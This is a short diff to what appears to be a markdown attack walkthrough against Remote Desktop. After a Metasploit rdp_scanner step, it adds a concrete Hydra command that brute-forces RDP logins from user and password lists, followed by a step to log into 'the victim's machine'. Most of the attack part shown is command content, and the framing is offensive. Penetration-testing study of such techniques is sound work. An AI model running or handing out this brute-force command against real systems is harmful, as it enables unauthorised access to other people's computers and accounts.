@@ -10,5 +10,8 @@
 
        use auxiliary/scanner/rdp/rdp_scanner
    
-4. use Hydra to brute force the login credentials
-5. use and RDP tools to login into the victim's machine
+3. use Hydra to brute force the login credentials
+
+       hydra -L user.txt -P password.txt rdp://IP -s PORT
+
+4. use and RDP tools to login into the victim's machine
